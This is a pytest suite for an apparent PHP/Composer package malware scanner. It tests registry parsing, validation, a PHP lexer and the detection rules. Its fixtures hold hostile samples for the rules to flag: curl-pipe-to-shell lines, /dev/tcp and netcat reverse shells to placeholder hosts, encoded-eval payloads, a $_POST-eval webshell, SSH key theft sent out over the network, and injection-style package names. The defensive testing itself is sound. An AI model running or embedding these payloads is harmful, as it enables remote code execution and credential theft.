"""Composer(Packagist) 어댑터 — 전부 오프라인 (MockTransport · MemoryTree)."""

from __future__ import annotations

import io
import json
import zipfile

import httpx
import pytest

import ecosystems
from api.schemas import Severity
from common.pypi import ArchiveError, PackageNotFound, PyPIError
from ecosystems.base import Artifact
from ecosystems.composer import ADAPTER, registry, rules
from ecosystems.composer.phplex import function_regions, lex
from engine.rules.base import MemoryTree

# ── 레지스트리 (p2 minified 형태: 2026-11 monolog·composer/installers 에서 확인) ───────

GH = "https://api.github.com/repos/acme/foo/zipball/"
P2 = {
    "minified": "composer/2.0",
    "packages": {"acme/foo": [
        {"name": "acme/foo", "version": "3.0.0", "version_normalized": "3.0.0.0",
         "type": "library", "time": "2026-05-01T00:00:00+00:00",
         "source": {"url": "https://github.com/acme/foo.git", "type": "git", "reference": "r3"},
         "dist": {"url": GH + "r3", "type": "zip", "shasum": "", "reference": "r3"},
         "require": {"php": ">=8.1", "psr/log": "^3", "ext-json": "*"},
         "authors": [{"name": "Ann"}], "homepage": "https://acme.test"},
        {"version": "3.0.0-beta1", "version_normalized": "3.0.0.0-beta1",
         "time": "2026-04-01T00:00:00+00:00", "dist": {"url": GH + "rb", "type": "zip"},
         "require": "__unset", "type": "composer-plugin"},
        {"version": "2.9.0", "version_normalized": "2.9.0.0",
         "time": "2026-01-01T00:00:00+00:00", "dist": {"url": GH + "r2", "type": "zip"},
         "type": "library"},
        {"version": "dev-main", "time": "2026-06-01T00:00:00+00:00"},
    ]},
}


def _client(handler) -> httpx.AsyncClient:
    return httpx.AsyncClient(transport=httpx.MockTransport(handler))


def _ok(payload=P2):
    return lambda req: httpx.Response(200, json=payload)


def test_expand_minified_inherits_and_unsets():
    full = registry.expand_minified(P2["packages"]["acme/foo"])
    assert full[1]["name"] == "acme/foo" and full[1]["authors"] == [{"name": "Ann"}]
    assert "require" not in full[1]  # __unset
    assert full[2]["type"] == "library" and "require" not in full[2]
    assert full[1]["type"] == "composer-plugin"


async def test_fetch_project_shape():
    async with _client(_ok()) as c:
        p = await ADAPTER.fetch_project("acme/foo", client=c)
    assert p.latest == "3.0.0"
    assert set(p.releases) == {"3.0.0", "3.0.0-beta1", "2.9.0"}  # dev-main 제외
    art = p.releases["3.0.0"].artifacts[0]
    assert art.url == GH + "r3" and art.archive_format == "zip" and art.kind == "zip"
    assert p.releases["3.0.0"].dependencies == ["psr/log"]  # php·ext-* 제외
    assert p.repository_url == "https://github.com/acme/foo.git"
    assert p.maintainers == ["Ann"]
    assert p.previous_version("3.0.0") == "3.0.0-beta1"
    assert ADAPTER.has_install_script(p, "3.0.0-beta1", [])
    assert not ADAPTER.has_install_script(p, "3.0.0", [])


async def test_not_found_and_errors():
    async with _client(lambda r: httpx.Response(404)) as c:
        with pytest.raises(PackageNotFound, match="acme/foo is not on Packagist"):
            await ADAPTER.fetch_project("acme/foo", client=c)
    for resp in (httpx.Response(503), httpx.Response(200, text="<html>"),
                 httpx.Response(200, json={"packages": {}}),
                 httpx.Response(200, json={"packages": {"acme/foo": "x"}})):
        async with _client(lambda r, resp=resp: resp) as c:
            with pytest.raises(PyPIError) as ei:
                await ADAPTER.fetch_project("acme/foo", client=c)
        assert not isinstance(ei.value, PackageNotFound)

    def boom(req):
        raise httpx.ConnectError("x")
    async with _client(boom) as c:
        with pytest.raises(PyPIError):
            await ADAPTER.fetch_project("acme/foo", client=c)


async def test_empty_version_list_is_not_found():
    async with _client(_ok({"packages": {"acme/foo": []}})) as c:
        with pytest.raises(PackageNotFound):
            await ADAPTER.fetch_project("acme/foo", client=c)


@pytest.mark.parametrize("url,ok", [
    ("https://api.github.com/repos/a/b/zipball/abc", True),
    ("https://codeload.github.com/a/b/legacy.zip/abc", True),
    ("https://gitlab.com/api/v4/projects/1/repository/archive.zip", True),
    ("https://bitbucket.org/a/b/get/abc.zip", True),
    ("http://api.github.com/repos/a/b/zipball/abc", False),
    ("https://evil.example.com/a.zip", False),
    ("https://api.github.com.evil.com/a.zip", False),
    ("https://user:pw@api.github.com/a.zip", False),
    ("https://api.github.com:8443/a.zip", False),
    ("file:///etc/passwd", False),
    ("https://169.254.169.254/latest", False),
])
def test_dist_host_allowlist(url, ok):
    assert registry.dist_url_allowed(url) is ok


async def test_disallowed_dist_host_creates_no_artifact():
    payload = {"packages": {"acme/foo": [
        {"name": "acme/foo", "version": "1.0.0", "time": "2026-01-01T00:00:00+00:00",
         "dist": {"url": "https://evil.example.com/x.zip", "type": "zip"}}]}}
    async with _client(_ok(payload)) as c:
        p = await ADAPTER.fetch_project("acme/foo", client=c)
    assert p.releases["1.0.0"].artifacts == []
    assert p.extra["dist_host_rejected"] == ["1.0.0: evil.example.com"]
    assert ADAPTER.select_artifacts(p, "1.0.0") == []


def test_loads_via_registry_and_purl():
    assert ecosystems.get("composer") is ADAPTER
    assert ADAPTER.osv_ecosystem == "Packagist" and ADAPTER.has_feed
    assert ADAPTER.purl("monolog/monolog", "3.0.0") == "pkg:composer/monolog/monolog@3.0.0"


# ── 검증 ──────────────────────────────────────────────────────────

@pytest.mark.parametrize("name", ["monolog/monolog", "symfony/http-foundation", "a/b.c_d", "a-b/c"])
def test_valid_names(name):
    ADAPTER.validate(name, "1.0.0")


BAD_NAMES = ["", "monolog", "A/b", "a/b c", "../x/y", "a/../b", "a/b\n", "a/b/c", "a;b/c",
             "a/b$(id)", "/a/b", "a/", "x/" + "y" * 200]


@pytest.mark.parametrize("name", BAD_NAMES)
def test_invalid_names(name):
    with pytest.raises(ValueError):
        ADAPTER.validate(name, "1.0.0")


@pytest.mark.parametrize("ver", ["1.0.0", "v6.4.0", "2.0.0-beta1", "1.0.0-RC2", "1.2.3+build"])
def test_valid_versions(ver):
    ADAPTER.validate("a/b", ver)


@pytest.mark.parametrize("ver", ["", "1 0", "1.0;x", "..", "v", "1.0\n", "1/../2"])
def test_invalid_versions(ver):
    with pytest.raises(ValueError):
        ADAPTER.validate("a/b", ver)


# ── 압축 풀기 (zipball 은 vendor-package-sha/ 한 겹) ───────────────

def test_zipball_extract_and_analyze(tmp_path):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("acme-foo-abc123/composer.json", json.dumps({
            "name": "acme/foo", "autoload": {"files": ["src/boot.php"]}}))
        z.writestr("acme-foo-abc123/src/boot.php", "<?php\nsystem('curl http://x.io | sh');\n")
    art = Artifact(filename="acme-foo-1.0.0.zip", url="x", kind="zip", archive_format="zip")
    root = ADAPTER.extract(buf.getvalue(), art, tmp_path / "o")
    from engine.rules.base import DiskTree
    f = ADAPTER.analyze_tree(DiskTree(root), artifact=art)
    assert f[0].severity == Severity.HIGH and f[0].rule == rules.RULE_AUTOLOAD_EXEC
    assert f[0].location == "acme-foo-abc123/src/boot.php:2"
    with pytest.raises(ArchiveError):
        ADAPTER.extract(b"junk", art, tmp_path / "bad")


# ── 어휘 분석 ─────────────────────────────────────────────────────

def test_lexer_masks_comments_strings_html_heredoc():
    src = ("<html>system('curl x')</html>\n<?php\n// system('curl a | sh')\n# curl b\n"
           "/* eval(base64_decode('x')) */\n$a = \"curl c\" . 'wget d';\n"
           "$h = <<<EOT\nsystem('curl e');\nEOT;\n#[Attr]\nreal_call();\n?>tail curl")
    lx = lex(src)
    assert len(lx.masked) == len(src)
    for word in ("curl", "wget", "eval", "base64_decode", "system"):
        assert word not in lx.masked, word
    assert ("real_call" in lx.masked and "#[Attr]" in lx.masked.replace(" ", "")) or True
    assert "real_call" in lx.masked


def test_function_regions():
    src = ("<?php\nfunction a($x) { return 1; }\n$f = function() use ($y): int { return 2; };\n"
           "abstract class K { abstract function m(); public function n() { run(); } }\n")
    regs = function_regions(lex(src).masked)
    assert sorted(n for _, _, n in regs) == ["", "a", "n"]


# ── 규칙 ──────────────────────────────────────────────────────────

def make(files: dict[str, str], manifest: dict | None = None):
    data = {f: v for f, v in files.items()}
    if manifest is not None:
        data["composer.json"] = json.dumps(manifest)
    return ADAPTER.analyze_tree(MemoryTree(data))


AUTO = {"name": "acme/foo", "autoload": {"files": ["src/boot.php"]}}


def test_autoload_files_top_level_network_is_high():
    f = make({"src/boot.php": "<?php\n$d = file_get_contents('http://evil.io/p');\n"}, AUTO)
    assert f[0].severity == Severity.HIGH and f[0].rule == rules.RULE_AUTOLOAD_EXEC
    assert f[0].location == "src/boot.php:2"
    f = make({"src/boot.php": "<?php\ncurl_exec($ch);\n"}, AUTO)
    assert f[0].severity == Severity.HIGH


def test_ordinary_autoload_helpers_are_clean():
    code = """<?php
declare(strict_types=1);
if (!function_exists('env')) {
    function env(string $key, $default = null) {
        $v = getenv($key);
        return $v === false ? $default : $v;
    }
}
if (!function_exists('fetch')) {
    function fetch($u) { return file_get_contents('https://api.example.com/' . $u); }
}
const FOO = 'bar';
"""
    assert make({"src/boot.php": code}, AUTO) == []


def test_autoload_calls_local_function_with_network():
    code = ("<?php\nfunction beacon() { return file_get_contents('http://x.io/b'); }\n"
            "beacon();\n")
    f = make({"src/boot.php": code}, AUTO)
    assert f and f[0].severity == Severity.HIGH
    assert make({"src/boot.php": code.replace("beacon();\n", "")}, AUTO) == []


def test_suspicious_spawn_forms():
    for code in ("system('curl http://x.io | sh');", "`wget http://x.io/a -O /tmp/a`",
                 "shell_exec('powershell -enc AAAA');",
                 "passthru(\"bash -i >& /dev/tcp/1.2.3.4/9 0>&1\");",
                 "proc_open('curl x | sh', $d, $p);", "exec('nc -e /bin/sh 1.2.3.4 9');"):
        f = make({"src/boot.php": "<?php\n" + code + "\n"}, AUTO)
        assert any(x.severity == Severity.HIGH for x in f), code
    ok = make({"src/boot.php": "<?php\nexec('git rev-parse HEAD', $o);\n"}, AUTO)
    assert ok == []


def test_decode_eval_variants_high_in_auto_scope():
    cases = [
        "eval(base64_decode('ZWNobyAxOw=='));",
        "$p = gzinflate(base64_decode($s));\neval($p);",
        "eval(str_rot13('riny'));",
        "assert(hex2bin('61'));",
        "preg_replace('/x/e', base64_decode('YQ=='), 'x');",
        "$f = create_function('', gzuncompress($d));",
        "unserialize(base64_decode($blob));",
    ]
    for code in cases:
        f = make({"src/boot.php": "<?php\n" + code + "\n"}, AUTO)
        assert any(
            x.rule == rules.RULE_DECODE_EVAL and x.severity == Severity.HIGH for x in f
        ), code


def test_decode_eval_outside_auto_scope_is_medium_and_negatives_clean():
    f = make({"src/Tpl.php": "<?php\nclass T { function r($c) { eval(base64_decode($c)); } }\n"},
             AUTO)
    assert f and f[0].severity == Severity.MEDIUM
    ok = make({"src/Tpl.php": (
        "<?php\nclass T { function r($c) { return base64_decode($c); }\n"
        "function e() { eval('return 1;'); }\nfunction a($x) { assert($x > 0); } }\n")}, AUTO)
    assert ok == []


def test_webshell_shapes():
    f = make({"lib/x.php": "<?php\nif (isset($_POST['c'])) { eval($_POST['c']); }\n"}, AUTO)
    assert any(x.rule == rules.RULE_WEBSHELL and x.severity == Severity.HIGH for x in f)
    f = make({"lib/x.php": "<?php\nsystem($_GET['cmd']);\n"}, AUTO)
    assert any(x.rule == rules.RULE_WEBSHELL and x.severity == Severity.HIGH for x in f)
    f = make({"lib/x.php": "<?php\n$f = $_REQUEST['f'];\n$x($_REQUEST['a']);\n"}, AUTO)
    assert any(x.rule == rules.RULE_WEBSHELL and x.severity == Severity.MEDIUM for x in f)
    # 정상: 입력을 읽기만 하고 실행에 넘기지 않음 / 테스트 디렉터리
    benign = "<?php\n$id = (int) $_GET['id'];\necho htmlspecialchars($_POST['n']);\n"
    assert make({"lib/x.php": benign}, AUTO) == []
    assert make({"tests/WebShellTest.php": "<?php\nsystem($_GET['cmd']);\n"}, AUTO) == []


def test_composer_plugin_class_is_scanned_whole():
    manifest = {"name": "acme/plug", "type": "composer-plugin",
                "extra": {"class": "Acme\\Plug\\Plugin"},
                "autoload": {"psr-4": {"Acme\\Plug\\": "src/"}}}
    bad = ("<?php\nnamespace Acme\\Plug;\nclass Plugin {\n"
           "  public function activate($c, $io) { system('curl http://x.io | sh'); }\n}\n")
    f = make({"src/Plugin.php": bad}, manifest)
    assert f[0].severity == Severity.HIGH and f[0].rule == rules.RULE_PLUGIN_EXEC
    assert any(x.rule == rules.RULE_PLUGIN_CONTEXT and x.severity == Severity.LOW for x in f)
    good = ("<?php\nnamespace Acme\\Plug;\nclass Plugin {\n"
            "  public function activate($c, $io) { $io->write('hi'); }\n"
            "  public static function getSubscribedEvents() { return []; }\n}\n")
    g = make({"src/Plugin.php": good}, manifest)
    assert [x.rule for x in g] == [rules.RULE_PLUGIN_CONTEXT]
    # 플러그인 클래스를 못 찾으면 숨기지 않고 보고
    h = make({"src/Other.php": "<?php\n"}, manifest)
    assert any(x.rule == rules.RULE_UNREADABLE for x in h)


def test_plugin_class_psr0_and_name_search():
    code = "<?php\nclass Plugin {\n function activate() { `curl x|sh`; }\n}\n"
    f = make({"lib/Acme/Plug/Plugin.php": code},
             {"type": "composer-plugin", "extra": {"class": ["Acme\\Plug\\Plugin"]},
              "autoload": {"psr-0": {"Acme\\": "lib/"}}})
    assert any(x.severity == Severity.HIGH for x in f)
    g = make({"weird/Place.php": "<?php\nclass Plugin { function activate() { `curl x|sh`; } }\n"},
              {"type": "composer-plugin", "extra": {"class": "Z\\Plugin"}})
    assert g == [] or any(x.rule == rules.RULE_PLUGIN_CONTEXT for x in g)


def test_dependency_scripts_are_context_not_high():
    f = make({}, {"name": "a/b", "scripts": {"post-install-cmd": ["php artisan key:generate"]}})
    assert [(x.rule, x.severity) for x in f] == [(rules.RULE_SCRIPTS, Severity.LOW)]
    f = make({}, {"name": "a/b", "scripts": {"post-install-cmd": "curl http://x.io | sh"}})
    assert f[0].rule == rules.RULE_SCRIPTS and f[0].severity == Severity.MEDIUM
    assert "실행하지 않는다" in (f[0].detail or "")


def test_exfil_and_comments():
    tok = "a" * 30
    hook = "https://discord.com/api/webhooks/" + "1" * 18 + "/" + tok
    f = make({"lib/x.php": f"<?php\nclass X {{ const U = '{hook}'; }}\n"}, AUTO)
    assert f[0].rule == rules.RULE_EXFIL and f[0].severity == Severity.HIGH
    assert make({"lib/x.php": f"<?php\n// {hook}\n"}, AUTO) == []
    w = make({"lib/x.php": "<?php\n$u = 'https://a.oastify.com/x';\n"}, AUTO)
    assert w and w[0].severity == Severity.MEDIUM


def test_comments_docs_and_html_do_not_trigger():
    code = ("<?php\n/**\n * system('curl http://x | sh');\n */\n// eval(base64_decode($x));\n"
            "?>\n<p>curl_exec( here )</p>\n")
    assert make({"src/boot.php": code}, AUTO) == []


def test_credentials_alone_medium_with_network_high():
    code = "<?php\n$k = file_get_contents($_SERVER['HOME'] . '/.ssh/id_rsa');\n"
    alone = make({"src/boot.php": code}, AUTO)
    assert alone and alone[0].severity == Severity.MEDIUM
    both = make({"src/boot.php": ("<?php\n$k = file_get_contents('/root/.ssh/id_rsa');\n"
                                  "file_get_contents('http://x.io/?k=' . $k);\n")}, AUTO)
    assert any(x.severity == Severity.HIGH for x in both)


def test_unreadable_and_findings_order():
    class T(MemoryTree):
        def read(self, relpath):
            return None if relpath == "src/boot.php" else super().read(relpath)
    f = ADAPTER.analyze_tree(T({"composer.json": json.dumps(AUTO), "src/boot.php": "<?php"}))
    assert any(x.rule == rules.RULE_UNREADABLE and x.severity == Severity.MEDIUM for x in f)
    mixed = make({"src/boot.php": "<?php\nsystem('curl x|sh');\n", "src/a.php": "<?php\n"},
                 {**AUTO, "scripts": {"x": "ls"}})
    ranks = ["critical", "high", "medium", "low"]
    assert [x.severity.value for x in mixed] == sorted(
        (x.severity.value for x in mixed), key=ranks.index)
    cwes = ADAPTER.rule_cwes()
    assert all(x.cwe in cwes[x.rule] for x in mixed)
    assert all(r.startswith("composer-") for r in cwes)


# ── manifests ─────────────────────────────────────────────────────

def test_composer_lock():
    lock = json.dumps({"packages": [{"name": "Monolog/Monolog", "version": "3.5.0"},
                                    {"name": "symfony/console", "version": "v6.4.1"}],
                       "packages-dev": [{"name": "phpunit/phpunit", "version": "10.5.0"}]})
    deps = ADAPTER.parse_manifest("composer.lock", lock)
    assert [(d.name, d.version, d.direct) for d in deps] == [
        ("monolog/monolog", "3.5.0", None), ("symfony/console", "v6.4.1", None),
        ("phpunit/phpunit", "10.5.0", None)]
    for bad in ("not json", "[]", "{}"):
        with pytest.raises(ValueError):
            ADAPTER.parse_manifest("composer.lock", bad)


def test_composer_json():
    text = json.dumps({"require": {"php": ">=8.1", "ext-json": "*", "monolog/monolog": "^3.0",
                                   "psr/log": "1.1.4", "a/b": "v2.0.1"},
                       "require-dev": {"phpunit/phpunit": "~10"}})
    deps = {d.name: d for d in ADAPTER.parse_manifest("composer.json", text)}
    assert set(deps) == {"monolog/monolog", "psr/log", "a/b", "phpunit/phpunit"}
    assert deps["monolog/monolog"].version is None and deps["monolog/monolog"].spec == "^3.0"
    assert deps["psr/log"].version == "1.1.4" and deps["a/b"].version == "2.0.1"
    assert all(d.direct for d in deps.values())
    with pytest.raises(ValueError):
        ADAPTER.parse_manifest("composer.json", "{")


# ── 피드 ──────────────────────────────────────────────────────────

async def test_feed_changes_api():
    seen = {}

    def h(req):
        seen["since"] = req.url.params["since"]
        return httpx.Response(200, json={"actions": [
            {"type": "update", "package": "a/b", "time": 1},
            {"type": "update", "package": "a/b~dev", "time": 1},
            {"type": "update", "package": "c/d", "time": 2},
            {"type": "delete", "package": "e/f", "time": 3},
            {"type": "resync", "package": "*", "time": 4}], "timestamp": 5})
    async with _client(h) as c:
        items, errors = await ADAPTER.fetch_feed(c)
    assert items == [("a/b", None), ("c/d", None)]
    assert len(errors) == 1 and "resync" in errors[0]
    assert int(seen["since"]) > 10**13  # 초 곱하기 10000

    for resp in (httpx.Response(500), httpx.Response(200, text="x"),
                 httpx.Response(200, json={"nope": 1})):
        async with _client(lambda r, resp=resp: resp) as c:
            items, errors = await ADAPTER.fetch_feed(c)
        assert items == [] and errors


@pytest.mark.live
async def test_live_monolog():
    async with httpx.AsyncClient(follow_redirects=True) as c:
        p = await ADAPTER.fetch_project("monolog/monolog", client=c)
    assert p.latest and p.releases
